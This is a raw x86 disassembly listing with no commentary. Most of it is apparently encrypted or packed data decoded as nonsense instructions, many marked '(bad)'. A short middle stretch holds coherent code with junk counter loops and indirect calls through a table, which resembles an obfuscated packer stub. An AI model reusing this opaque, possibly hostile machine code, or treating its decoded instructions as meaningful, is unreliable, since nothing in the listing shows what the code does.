  40aa81:	jnp    0x40aae8
  40aa83:	sbb    al,0x6d
  40aa85:	int    0xe9
  40aa87:	mov    esp,0xec2de683
  40aa8c:	mov    eax,0xfa61d3ec
  40aa91:	push   ebx
  40aa92:	jae    0x40aa1e
  40aa94:	lods   al,BYTE PTR ds:[esi]
  40aa95:	add    cl,BYTE PTR [ecx-0x7a86ba70]
  40aa9b:	lods   al,BYTE PTR ds:[esi]
  40aa9c:	push   ds
  40aa9d:	pop    ds
  40aa9e:	outs   dx,BYTE PTR ds:[esi]
  40aa9f:	cmp    al,0xd6
  40aaa1:	xor    eax,0x9b47eb06
  40aaa6:	or     bh,cl
  40aaa8:	push   esi
  40aaa9:	push   edi
  40aaaa:	arpl   WORD PTR [ebx],bx
  40aaac:	push   cs
  40aaad:	js     0x40aa65
  40aaaf:	jnp    0x40aa9c
  40aab1:	push   edx
  40aab2:	adc    BYTE PTR [edx],0x69
  40aab5:	sub    eax,esi
  40aab7:	mov    ecx,0xfecc0d6d
  40aabc:	push   esi
  40aabd:	xchg   edx,eax
  40aabe:	mov    ebx,0x3cc8346b
  40aac3:	ss mov ebx,0xc4c051b6
  40aac9:	fs push ecx
  40aacb:	(bad)  
  40aacc:	(bad)
  40aacf:	imul   BYTE PTR [edi+0x1e]
  40aad2:	adc    edi,ecx
  40aad4:	adc    DWORD PTR [edx],ecx
  40aad6:	dec    ebx
  40aad7:	imul   eax,DWORD PTR [ebx-0xecda12d],0x1872ee52
  40aae1:	fwait
  40aae2:	ret    
  40aae3:	cmp    ah,BYTE PTR [ebx+ebx*1-0x771cfac2]
  40aaea:	in     al,dx
  40aaeb:	jl     0x40ab3f
  40aaed:	mov    edx,0xb153c7cd
  40aaf2:	mov    esp,0x53167ff5
  40aaf7:	loopne 0x40ab68
  40aaf9:	pop    ds
  40aafa:	pop    esp
  40aafb:	sbb    al,0xde
  40aafd:	ins    DWORD PTR es:[edi],dx
  40aafe:	mov    ah,0x9d
  40ab00:	(bad)
  40ab05:	loope  0x40aad5
  40ab07:	mov    ebx,0x80a6c685
  40ab0c:	adc    ecx,DWORD PTR [edi-0x6c0595ab]
  40ab12:	and    eax,edx
  40ab14:	jmp    0x3c22d32
  40ab19:	push   0x16e32d11
  40ab1e:	cli    
  40ab1f:	out    0xb1,eax
  40ab21:	pop    ecx
  40ab22:	cmp    al,0x4d
  40ab24:	outs   dx,BYTE PTR ds:[esi]
  40ab25:	sub    BYTE PTR [edx+0x62cf4a15],cl
  40ab2b:	push   ebx
  40ab2c:	int    0x9e
  40ab2e:	loop   0x40ab2f
  40ab30:	test   al,0xcb
  40ab32:	cmp    eax,edx
  40ab34:	push   esi
  40ab35:	mov    ebx,edx
  40ab37:	mov    eax,ecx
  40ab39:	and    eax,DWORD PTR [ebp+ebp*1+0x3e6a508e]
  40ab40:	xor    BYTE PTR [ecx],0x4a
  40ab43:	lea    edi,[ecx+0x5109d04c]
  40ab49:	dec    ebp
  40ab4a:	xchg   ebp,eax
  40ab4b:	cmp    ah,bh
  40ab4d:	sbb    cl,ah
  40ab4f:	gs in  al,dx
  40ab51:	ja     0x40aae6
  40ab53:	inc    edx
  40ab54:	push   eax
  40ab55:	jecxz  0x40ab0e
  40ab57:	add    ebp,DWORD PTR [ebx]
  40ab59:	aam    0x7a
  40ab5b:	test   eax,0x4682cd14
  40ab60:	inc    esi
  40ab61:	xor    esp,DWORD PTR [ebx-0x25]
  40ab64:	mov    eax,ds:0xbcc12cad
  40ab69:	repnz out dx,al
  40ab6b:	pop    ss
  40ab6c:	push   0xffffffec
  40ab6e:	xlat   BYTE PTR ds:[ebx]
  40ab6f:	add    eax,0x60449071
  40ab74:	xor    ebp,edx
  40ab76:	fdiv   QWORD PTR [eax]
  40ab78:	push   ebx
  40ab79:	inc    eax
  40ab7a:	out    dx,al
  40ab7b:	mov    ebx,0xd803271e
  40ab80:	cmp    al,0x39
  40ab82:	ds rcl dl,0xaa
  40ab86:	ins    BYTE PTR es:[edi],dx
  40ab87:	sub    al,BYTE PTR [ebp-0x17fb8c08]
  40ab8d:	sub    DWORD PTR [ebx+0x62c3ed67],0x4f
  40ab94:	add    eax,0x3d306143
  40ab99:	ret    0x5887
  40ab9c:	push   cs
  40ab9d:	xchg   esi,eax
  40ab9e:	jae    0x40ab69
  40aba0:	push   ebx
  40aba1:	add    eax,0x8570e3b7
  40aba6:	ja     0x40abe4
  40aba8:	xchg   ebx,eax
  40aba9:	out    0xf7,al
  40abab:	fcomp  QWORD PTR [ecx-0x4f98433b]
  40abb1:	add    dl,BYTE PTR [edi-0x6f]
  40abb4:	adc    al,BYTE PTR [edi+0x76]
  40abb7:	leave  
  40abb8:	cwde   
  40abb9:	jnp    0x40ac0c
  40abbb:	jno    0x40abf0
  40abbd:	lds    eax,FWORD PTR [esi-0x4f]
  40abc0:	jne    0x40ac31
  40abc2:	test   DWORD PTR [edi+0x16],eax
  40abc5:	iret   
  40abc6:	loop   0x40abdb
  40abc8:	pop    ebp
  40abc9:	icebp  
  40abca:	mov    edi,0xb61567ad
  40abcf:	ror    eax,cl
  40abd1:	adc    bh,BYTE PTR ds:0x8ad75704
  40abd7:	sbb    cl,ah
  40abd9:	mov    dl,0x46
  40abdb:	or     al,0x72
  40abdd:	push   ss
  40abde:	test   eax,0xd0870310
  40abe3:	cmp    eax,0x40cfe779
  40abe8:	ja     0x40abf0
  40abea:	push   ebx
  40abeb:	ffreep st(2)
  40abed:	bnd jns 0x40ac31
  40abf0:	outs   dx,BYTE PTR ds:[esi]
  40abf1:	add    eax,0x6ebaf29
  40abf6:	lods   al,BYTE PTR ds:[esi]
  40abf7:	imul   ebx,DWORD PTR [ebp-0x64],0xffffffb0
  40abfb:	mov    ds:0x487dab2e,eax
  40ac00:	xor    edx,eax
  40ac02:	xor    DWORD PTR ds:0x42fcf5,0x42e70f
  40ac0c:	add    edx,ecx
  40ac0e:	mov    DWORD PTR ds:0x42e703,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fcdd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fd7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fcf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e6f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e6f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e23d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e2f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e6f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e6f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e128,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e128
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e128,ebx
  40acad:	cmp    DWORD PTR ds:0x42e128,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e128,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e2f7
  40acd5:	cmp    DWORD PTR ds:0x42e128,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e128
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e128,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e134
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fce1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fce1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fce1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd01
  40ad3c:	call   DWORD PTR ds:0x42e54b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fce1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fce1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ade1
  40adb4:	ret    
  40adb5:	ins    BYTE PTR es:[edi],dx
  40adb6:	dec    eax
  40adb7:	add    edi,ebp
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40adb1
  40adc0:	sbb    ecx,DWORD PTR [edx+0x20]
  40adc3:	iret   
  40adc4:	sub    ecx,DWORD PTR [eax]
  40adc6:	and    ch,al
  40adc8:	ins    BYTE PTR es:[edi],dx
  40adc9:	ja     0x40ad62
  40adcb:	sub    bl,dl
  40adcd:	out    dx,al
  40adce:	fimul  DWORD PTR [ecx]
  40add0:	mov    DWORD PTR [eax+0x23],0xe0dfd55f
  40add7:	mov    al,BYTE PTR [eax+0x1e]
  40adda:	push   edi
  40addb:	mov    dh,0x13
  40addd:	and    eax,0x975502b1
  40ade2:	cmp    eax,0x6a2e6d6b
  40ade7:	(bad)  
  40ade8:	mov    bl,0xe6
  40adea:	dec    edi
  40adeb:	push   ss
  40adec:	pushf  
  40aded:	int3   
  40adee:	jo     0x40ae14
  40adf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adf1:	adc    eax,0xaf4d81e8
  40adf6:	dec    ebp
  40adf7:	(bad)  
  40adf8:	or     ch,BYTE PTR [ebx+0x70c87f27]
  40adfe:	cmp    bh,BYTE PTR [esi]
  40ae00:	test   BYTE PTR [edx],al
  40ae02:	push   ss
  40ae03:	mov    edx,0x155080eb
  40ae08:	and    BYTE PTR [eax-0x3e],dh
  40ae0b:	dec    edx
  40ae0c:	daa    
  40ae0d:	push   0xffffffc9
  40ae0f:	mul    al
  40ae11:	mov    ds:0x343223ab,eax
  40ae16:	pushf  
  40ae17:	neg    BYTE PTR gs:[esi]
  40ae1a:	and    al,0xa2
  40ae1c:	mov    edx,0x1362e4b
  40ae21:	enter  0x327,0x53
  40ae25:	lahf   
  40ae26:	cld    
  40ae27:	nop
  40ae28:	lods   eax,DWORD PTR ds:[esi]
  40ae29:	mov    edi,0x51ac3ad4
  40ae2e:	and    dl,BYTE PTR [edi-0x43]
  40ae31:	into   
  40ae32:	sub    ecx,DWORD PTR [edx+0xa2db5ed]
  40ae38:	scas   al,BYTE PTR es:[edi]
  40ae39:	add    ah,bl
  40ae3b:	fstp   DWORD PTR [ebx+edx*2+0x6e9b5b69]
  40ae42:	jo     0x40adfc
  40ae44:	std    
  40ae45:	pop    eax
  40ae46:	stc    
  40ae47:	fstp   st(7)
  40ae49:	mov    esi,0xdd40f4fd
  40ae4e:	dec    edi
  40ae4f:	inc    edi
  40ae50:	mov    esp,0xc28186cc
  40ae55:	cs pop eax
  40ae57:	mov    esi,0x42b70606
  40ae5c:	xchg   ebx,eax
  40ae5d:	mov    al,ds:0xbfccc187
  40ae62:	cmp    ch,BYTE PTR [edx-0x56]
  40ae65:	pop    ss
  40ae66:	js     0x40ae8d
  40ae68:	mov    ebp,0xf9104e54
  40ae6d:	pop    edi
  40ae6e:	mov    esi,0xcd13aeb2
  40ae73:	outs   dx,DWORD PTR ds:[esi]
  40ae74:	ins    DWORD PTR es:[edi],dx
  40ae75:	lods   al,BYTE PTR ds:[esi]
  40ae76:	dec    ebx
  40ae77:	ret    0x7bba
  40ae7a:	pusha  
  40ae7b:	aaa    
  40ae7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae7d:	fbstp  TBYTE PTR [eax+0x1072fb23]
  40ae83:	sbb    al,0x5c
  40ae85:	ror    DWORD PTR [esi],1
  40ae87:	test   BYTE PTR [edx+0x30fe23cc],al
  40ae8d:	jb     0x40ae48
  40ae8f:	add    al,0xe7
  40ae91:	call   FWORD PTR [edx]
  40ae93:	xchg   BYTE PTR [ecx+0x679ad119],ah
  40ae99:	in     eax,dx
  40ae9a:	es jmp 0x4f676be5
  40aea0:	rep lods al,BYTE PTR ds:[esi]
  40aea2:	setle  BYTE PTR [edi]
  40aea5:	and    cl,bh
  40aea7:	mov    bh,0x48
  40aea9:	adc    al,0x91
  40aeab:	jno    0x40af08
  40aead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aeae:	sub    al,0x3
  40aeb0:	scas   eax,DWORD PTR es:[edi]
  40aeb1:	or     ebx,DWORD PTR [ebx]
  40aeb3:	mov    dl,0x4
  40aeb5:	jecxz  0x40af2e
  40aeb7:	pop    eax
  40aeb8:	ins    BYTE PTR es:[edi],dx
  40aeb9:	pop    edx
  40aeba:	je     0x40ae89
  40aebc:	aad    0xb5
  40aebe:	push   edi
  40aebf:	or     DWORD PTR [eax-0x60],0x28020b99
  40aec6:	push   es
  40aec7:	mov    al,0x37
  40aec9:	stos   DWORD PTR es:[edi],eax
  40aeca:	pushf  
  40aecb:	push   0x79dbb1c2
  40aed0:	lods   al,BYTE PTR ds:[esi]
  40aed1:	mov    ecx,0x1cdfca72
  40aed6:	mov    DWORD PTR [edi],eax
  40aed8:	push   edi
  40aed9:	jmp    0x40af32
  40aedb:	pop    esi
  40aedc:	jb     0x40af09
  40aede:	leave  
  40aedf:	jmp    DWORD PTR [ebp-0x3f5965ae]
  40aee5:	jae    0x40af04
  40aee7:	cdq    
  40aee8:	lods   al,BYTE PTR ds:[esi]
  40aee9:	add    esi,0x48
  40aeec:	ss popf 
  40aeee:	mov    ch,0xc2
  40aef0:	dec    edi
  40aef1:	cwde   
  40aef2:	mov    ah,0xe7
  40aef4:	adc    eax,0x722d1c96
  40aef9:	xchg   ebx,eax
  40aefa:	in     eax,0x96
  40aefc:	mov    ds:0x22cf4673,eax
  40af01:	cmp    eax,0x3cb9c5a2
  40af06:	pushf  
  40af07:	in     eax,dx
  40af08:	cld    
  40af09:	(bad)  
  40af0a:	call   0xf5daf5c7
  40af0f:	and    DWORD PTR [edx-0x1b],edi
  40af12:	icebp  
  40af13:	xor    ebx,DWORD PTR [esi+ebp*4-0x28]
  40af17:	test   BYTE PTR [ecx+0x6beeafd4],dh
  40af1d:	pushf  
  40af1e:	out    0x53,al
  40af20:	push   cs
  40af21:	sbb    DWORD PTR [edi],0xf
  40af24:	and    esi,ebp
  40af26:	arpl   sp,dx
  40af28:	shr    DWORD PTR [ebx-0x42822d18],0x77
  40af2f:	loopne 0x40af73
  40af31:	fs mov eax,0x4505913c
  40af37:	popa   
  40af38:	clts   
  40af3a:	in     al,dx
  40af3b:	retf   0xa8f7
  40af3e:	rcr    BYTE PTR ds:0x41034b0d,0xdb
  40af45:	adc    eax,0x37270d7d
  40af4a:	and    al,0x3b
  40af4c:	inc    esp
  40af4d:	xor    edx,DWORD PTR [ebp+0x5641967e]
  40af53:	push   ebp
  40af54:	(bad)  
  40af55:	inc    esi
  40af56:	pop    ss
  40af57:	jge    0x40af63
  40af59:	or     ebx,DWORD PTR [ebx-0x7f]
  40af5c:	pusha  
  40af5d:	retf   
  40af5e:	push   ecx
  40af5f:	cwde   
  40af60:	je     0x40af95
  40af62:	pop    esp
  40af63:	retf   
  40af64:	out    0xf0,al
  40af66:	das    
  40af67:	cmp    bh,BYTE PTR [esp+ecx*4+0x363d5682]
  40af6e:	mov    bh,0x18
  40af70:	fbld   TBYTE PTR cs:[ecx+ebx*8+0x1089d08c]
  40af78:	mov    ds:0x4ea161fd,eax
  40af7d:	xchg   ebx,eax
  40af7e:	jle    0x40af6d
  40af80:	addr16 jge 0x40af6c
  40af83:	cmp    BYTE PTR [edx+0x4],ch
  40af86:	test   BYTE PTR [ebx-0x22],bh
  40af89:	jmp    0x40af3e
  40af8b:	sub    BYTE PTR [ecx],dl
  40af8d:	loope  0x40af94
  40af8f:	popa   
  40af90:	jae    0x40afd8
  40af92:	add    al,BYTE PTR [ecx-0x60]
  40af95:	(bad)  
  40af96:	adc    eax,0xcdd1d419
  40af9b:	(bad)
  40af9e:	pop    ds
  40af9f:	adc    al,0x57
  40afa1:	fimul  DWORD PTR [edi+0x7cc7c733]
  40afa7:	fcom   DWORD PTR [edx-0x32aea7ac]
  40afad:	jno    0x40afea
  40afaf:	cmp    ch,BYTE PTR [ebp-0x56]
  40afb2:	dec    esp
  40afb3:	(bad)  
  40afb4:	mov    eax,ds:0x756b173a
  40afb9:	jns    0x40afba
  40afbb:	cmp    BYTE PTR [esi-0x32],cl
  40afbe:	sub    BYTE PTR [ebx+ebx*8+0x1107f8cd],ch
  40afc5:	rcr    DWORD PTR [ecx+0x47],0x64
  40afc9:	mov    dl,0x97
  40afcb:	cmp    BYTE PTR [ebx-0x27],bl
  40afce:	imul   ebx,DWORD PTR [esi-0x40],0x77414f68
  40afd5:	(bad)
  40afd8:	mov    edx,0x7f9fdb2a
  40afdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afde:	cmp    BYTE PTR [esi],0xf5
  40afe1:	cmp    bh,dh
  40afe3:	add    al,BYTE PTR [ebx]
  40afe5:	dec    esp
  40afe6:	mov    edx,0xa1645bbe
  40afeb:	mov    bl,0x50
  40afed:	aas    
  40afee:	(bad)  
  40afef:	rol    DWORD PTR [edi-0x5ea8a413],0x3b
  40aff6:	fldcw  WORD PTR [ebx+0x71e16c55]
  40affc:	je     0x40b022
  40affe:	inc    esi
  40afff:	loope  0x40b032
  40b001:	add    BYTE PTR [ecx],0xb6
  40b004:	sbb    ebp,DWORD PTR [ebp+0x32]
  40b007:	jmp    0x8696f11
  40b00c:	cdq    
  40b00d:	and    esp,edx
  40b00f:	add    ah,cl
  40b011:	dec    edx
  40b012:	adc    eax,0xa22201f2
  40b017:	clc    
  40b018:	shl    edx,1
  40b01a:	iret   
  40b01b:	add    edx,edx
  40b01d:	sbb    BYTE PTR [edi+0x554cc049],bl
  40b023:	loop   0x40afde
  40b025:	and    eax,0xb6d31469
  40b02a:	inc    edx
  40b02b:	mov    esp,0x14ac5a6f
  40b030:	clc    
  40b031:	sub    DWORD PTR [edi-0x60],0xffffffb6
  40b035:	add    al,0x17
  40b037:	push   0x51d5d09d
  40b03c:	pop    ecx
  40b03d:	gs call 0x9cbb51c2
  40b043:	aam    0x1f
  40b045:	ds adc eax,0xcfbaa8d
  40b04b:	xor    BYTE PTR [esi+0x63093a3a],dh
  40b051:	lds    edx,FWORD PTR [edi-0x57]
  40b054:	push   es
  40b055:	jno    0x40b093
  40b057:	xchg   ebp,eax
  40b058:	fwait
  40b059:	fwait
  40b05a:	int    0xfc
  40b05c:	cmp    BYTE PTR [edx-0x65],bl
  40b05f:	jmp    0xe7ba:0x7b46005c
  40b066:	pop    es
  40b067:	dec    esp
  40b068:	pop    es
  40b069:	popa   
  40b06a:	cmp    al,0x16
  40b06c:	outs   dx,DWORD PTR ds:[esi]
  40b06d:	repz mov al,bh
  40b070:	adc    al,0x85
  40b072:	sbb    edx,DWORD PTR [ebp+0x61]
  40b075:	popf   
  40b076:	les    esp,FWORD PTR [esi+0x37]
  40b079:	mov    eax,ebp
  40b07b:	aam    0x62
  40b07d:	inc    eax
  40b07e:	xchg   DWORD PTR [esi],edi
  40b080:	mov    esi,0xf0a429c6
  40b086:	mov    ebp,0x4828ac92
  40b08b:	test   eax,0xdd4b726f
  40b090:	in     al,dx
  40b091:	inc    edi
  40b092:	jle    0x40b097
  40b094:	cs retf 
  40b096:	or     al,0x1e
  40b098:	(bad)  
  40b09a:	test   BYTE PTR [ecx-0x568989a2],cl
  40b0a0:	mov    eax,gs:0x3a706c12
  40b0a6:	into   
  40b0a7:	js     0x40b0ef
  40b0a9:	xor    al,0x35
  40b0ab:	push   ss
  40b0ac:	jmp    0xcd97f680
  40b0b1:	push   esi
  40b0b2:	ss and al,0x1a
  40b0b5:	ja     0x40b0e0
  40b0b7:	jp     0x40b097
  40b0b9:	fmul   QWORD PTR [eax-0x75]
  40b0bc:	dec    ebx
  40b0bd:	into   
  40b0be:	fs ins BYTE PTR es:[di],dx
  40b0c1:	pop    edx
  40b0c2:	aas    
  40b0c3:	je     0x40b06a
  40b0c5:	test   dl,dh
  40b0c7:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0c9:	adc    eax,0x39bed977
  40b0ce:	aad    0xbf
  40b0d0:	cmc    
  40b0d1:	cmp    eax,0xe5061c1c
  40b0d6:	adc    eax,0x93018dae
  40b0db:	dec    ebx
  40b0dc:	aas    
  40b0dd:	ins    BYTE PTR es:[edi],dx
  40b0de:	jae    0x40b091
  40b0e0:	pop    es
  40b0e1:	cmp    BYTE PTR [eax+0x6d108187],dl
  40b0e7:	jge    0x40b0a3
  40b0e9:	test   DWORD PTR [ebx+0x23bc7c60],0x28f3a093
  40b0f3:	adc    esi,DWORD PTR [edx+0x61]
  40b0f6:	outs   dx,DWORD PTR ds:[esi]
  40b0f7:	shr    BYTE PTR [edi+0x18f595f3],1
  40b0fd:	or     BYTE PTR [esi],0x77
  40b100:	aas    
  40b101:	pop    DWORD PTR [esp+esi*2-0x432bbf38]
  40b108:	ret    
  40b109:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b10a:	or     al,0x15
  40b10c:	js     0x40b0ef
  40b10e:	test   BYTE PTR [esi],dl
  40b110:	imul   DWORD PTR [edi]
  40b112:	push   eax
  40b113:	mov    dh,0x2f
  40b115:	pop    ecx
  40b116:	cs pop esi
  40b118:	push   ebp
  40b119:	jno    0x40b185
  40b11b:	jmp    0x40b102
  40b11d:	inc    esi
  40b11e:	ror    eax,cl
  40b120:	mov    edx,0xa077936a
  40b125:	aaa    
  40b126:	jle    0x40b124
  40b128:	add    dh,BYTE PTR [esi+0x6c6b532c]
  40b12e:	imul   esi,DWORD PTR [edx+0x63],0xa7883242
  40b135:	pop    ds
  40b136:	das    
  40b137:	retf   0xd078
  40b13a:	imul   edx,DWORD PTR [ebx+0x65749578],0x4902f538
  40b144:	xchg   esp,eax
  40b145:	sbb    ah,BYTE PTR [esi-0xf]
  40b148:	(bad)  
  40b149:	xchg   esi,eax
  40b14a:	push   ebp
  40b14b:	into   
  40b14c:	jb     0x40b140
  40b14e:	pop    esi
  40b14f:	inc    edi
  40b150:	dec    edi
  40b151:	shl    DWORD PTR [eax-0x27dfc608],0x16
  40b158:	adc    BYTE PTR [ecx+0x381b7732],0x86
  40b15f:	add    DWORD PTR [ebx],0xffffffd1
  40b162:	jmp    0x40b520
  40b167:	shl    BYTE PTR [ebp+0x37],cl
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	inc    ecx
  40b175:	stos   BYTE PTR es:[edi],al
  40b176:	and    BYTE PTR [edx-0x608f8f06],0x7d
  40b17d:	jo     0x40b1ef
  40b17f:	adc    al,0xf3
  40b181:	out    0x7a,al
  40b183:	or     bh,BYTE PTR [edi-0x57d669c7]
  40b189:	xor    esp,DWORD PTR [edi]
  40b18b:	rcr    DWORD PTR [edx-0x3c],1
  40b18e:	cmp    dl,BYTE PTR [edi-0x62]
  40b191:	scas   eax,DWORD PTR es:[edi]
  40b192:	out    dx,eax
  40b193:	jmp    0x40b20a
  40b195:	mov    ds:0x6700af46,eax
  40b19a:	mov    bl,0xed
  40b19c:	inc    ecx
  40b19d:	push   ds
  40b19e:	or     eax,0x24ccd08e
  40b1a3:	jmp    0x40b189
  40b1a5:	xchg   DWORD PTR [ebp-0xed36f22],ebp
  40b1ab:	or     eax,0xcf30f4b0
  40b1b0:	popa   
  40b1b1:	iret   
  40b1b2:	jmp    0xada:0xca2da37d
  40b1b9:	xchg   edi,eax
  40b1ba:	mov    al,ds:0x2b7691b6
  40b1bf:	ss xchg ecx,eax
  40b1c1:	pusha  
  40b1c2:	or     al,0x4f
  40b1c4:	out    0x85,eax
  40b1c6:	pop    ds
  40b1c7:	jl     0x40b178
  40b1c9:	ins    DWORD PTR es:[edi],dx
  40b1ca:	fwait
  40b1cb:	into   
  40b1cc:	adc    BYTE PTR [ecx],dl
  40b1ce:	jmp    0xcb2f:0x21a921ec
  40b1d5:	ins    BYTE PTR es:[edi],dx
  40b1d6:	or     ebx,edx
  40b1d8:	ins    BYTE PTR es:[edi],dx
  40b1d9:	dec    ebx
  40b1da:	mov    BYTE PTR [esi-0xa01d83d],dh
  40b1e0:	sbb    BYTE PTR [esi-0x3d],cl
  40b1e3:	nop
  40b1e4:	mov    cl,0x2c
  40b1e6:	icebp  
  40b1e7:	cdq    
  40b1e8:	rcl    dl,cl
  40b1ea:	loop   0x40b23d
  40b1ec:	test   al,0x16
  40b1ee:	jb     0x40b1a9
  40b1f0:	lods   eax,DWORD PTR ds:[esi]
  40b1f1:	add    edi,DWORD PTR [edi-0x7b690a6f]
  40b1f7:	fmul   st(1),st
  40b1f9:	ins    DWORD PTR es:[edi],dx
  40b1fa:	inc    esi
  40b1fb:	xlat   BYTE PTR ds:[ebx]
  40b1fc:	mov    dh,0x77
  40b1fe:	stos   DWORD PTR es:[edi],eax
  40b1ff:	sub    ecx,DWORD PTR [eax+ebp*1]
  40b202:	iret   
  40b203:	fisttp WORD PTR [esi-0x353f40b6]
  40b209:	sbb    eax,0x6d43467b
  40b20e:	mov    esp,0x9d2b026d
  40b213:	inc    ecx
  40b214:	out    0x52,al
  40b216:	enter  0xbad3,0xe
  40b21a:	jg     0x40b207
  40b21c:	and    DWORD PTR [edi-0x205d68d9],ebx
  40b222:	cli    
  40b223:	jae    0x40b270
  40b225:	pop    edx
  40b226:	es push es
  40b228:	inc    edx
  40b229:	mov    cl,0x80
  40b22b:	xchg   ecx,eax
  40b22c:	mov    eax,0xc067631c
  40b231:	mov    al,0xd2
  40b233:	mov    edx,0x878ec673
  40b238:	icebp  
  40b239:	mov    bh,0x58
  40b23b:	xchg   ebp,eax
  40b23c:	jno    0x40b25c
  40b23e:	adc    ebp,DWORD PTR [edx]
  40b240:	scas   al,BYTE PTR es:[edi]
  40b241:	je     0x40b1e9
  40b243:	cmp    eax,0x9e1e1e01
  40b248:	sbb    DWORD PTR [ebp-0x19308795],esp
  40b24e:	inc    BYTE PTR [esp+ecx*8]
  40b251:	pop    eax
  40b252:	arpl   WORD PTR [eax-0x24c0459f],dx
  40b258:	repz adc ah,0xec
  40b25c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b25d:	jmp    0x7569:0xe004ce1d
  40b264:	retf   
  40b265:	std    
  40b266:	arpl   ax,bp
  40b268:	cmp    eax,0xc994251f
  40b26d:	addr16 dec ebx
  40b26f:	lea    esp,ds:0xad95fe6e
  40b275:	mov    esp,0x68c2800d
  40b27a:	sbb    ah,BYTE PTR [esi-0x613e95ed]
  40b280:	cld    
  40b281:	jg     0x40b22c
  40b283:	jmp    0x40b26b
  40b285:	ret    
  40b286:	mov    ds:0xeff02019,al
  40b28b:	fisub  DWORD PTR [edi]
  40b28d:	push   es
  40b28e:	xchg   ebp,eax
  40b28f:	mov    BYTE PTR [edi+ecx*2+0x52f6d6da],ch
  40b296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b297:	(bad)  
  40b298:	jne    0x40b297
  40b29a:	int3   
  40b29b:	jnp    0x40b21e
  40b29d:	hlt    
  40b29e:	cmp    DWORD PTR ds:0x3477a34,0xfffffffb
  40b2a5:	gs scas eax,DWORD PTR es:[edi]
  40b2a7:	scas   eax,DWORD PTR es:[edi]
  40b2a8:	cwde   
  40b2a9:	sub    eax,0x32e75b30
  40b2ae:	pop    es
  40b2af:	xchg   esp,eax
  40b2b0:	dec    eax
  40b2b1:	inc    esp
  40b2b2:	neg    BYTE PTR [ebp+0x9]
  40b2b5:	sub    al,0x6c
  40b2b7:	leave  
